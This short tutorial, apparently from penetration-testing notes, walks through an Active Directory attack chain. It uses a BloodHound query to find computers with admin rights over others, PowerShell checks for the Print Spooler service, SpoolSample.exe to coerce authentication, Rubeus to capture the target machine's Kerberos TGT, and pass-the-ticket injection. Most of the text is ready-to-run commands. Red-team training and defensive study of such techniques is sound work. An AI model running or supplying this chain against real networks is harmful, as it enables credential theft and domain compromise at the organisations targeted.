We can use a custom Bloodhound query to find computer accounts that have admin rights over other computer accounts:
```
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
```
If the output show us that there is a computer account(the target machine) have admin rights over other computer account, now we should see if the *Print Spooler Service* running or not on the target machine:
```
# Try this...
Get-WmiObject Win32_Printer -Computer <hostname.fqdn>
# Or, this...
Get-PrinterPort -ComputerName <hostname.fqdn>
```
Once we determinde that the *Print Spooler Service* is running, we will force it to authenticate with our machine using ```SpoolSample.exe``` tool :
```
SpoolSample.exe <TargetMachine> <OurMachine>     #OurMachine -> the TargetMachine has admin rights on
```
And a listener running in the bachground capturing the authenticated TGT comming from the Target Machine using ```Rubeus.exe``` tool :
```
Rubeus.exe monitor /monitorinterval:10 /targetuser:<TargetMachine> /nowrap
```
Now using the comming TGT we can inject it into our session using *Mimikatz* or *Rubues* :
```
Rubeus.exe ptt /ticket:<TGTticket>
```
